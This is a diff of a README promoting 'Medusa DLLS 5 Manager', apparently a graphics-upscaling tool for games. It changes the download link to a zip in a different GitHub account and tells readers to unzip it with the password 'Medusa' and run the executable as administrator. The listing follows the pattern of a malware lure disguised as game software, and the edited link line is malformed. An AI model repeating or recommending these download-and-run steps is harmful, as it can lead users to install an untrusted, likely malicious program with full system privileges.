@@ -25,13 +25,13 @@ Control by the developers. Artists and developers receive tools for fine‑tunin
 
 ## How to use
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/marcus-clark2005o6/medusa/releases/download/medusa/Medusa.zip)
+[![Download Now](https://github.com/ryantaylorhq03v0/DLLS5-Medusa/releases/download/dlls5/DLLS5.MedusaTeam.zip)
 
 1. Download the Medusa archive by clicking the button above
 
 2. Unzip the zip archive to any free space using the password “Medusa”
 
-3. Run Medusa.exe as an administrator
+3. Run Medusa DLLS5.exe as an administrator
 
 - After a quick installation, Medusa DLLS 5 Manager will open, where you can view a list of all the games in which you can try DLLS 5.
 
@@ -56,6 +56,7 @@ Control by the developers. Artists and developers receive tools for fine‑tunin
 - Monster Hunter Wilds
 - Silent Hill 2 
 - Witcher 3
+- Grand Theft Auto: San Andreas
 
 Games are added every day; keep an eye on the app itself — you’ll receive notifications when each game is added.
 
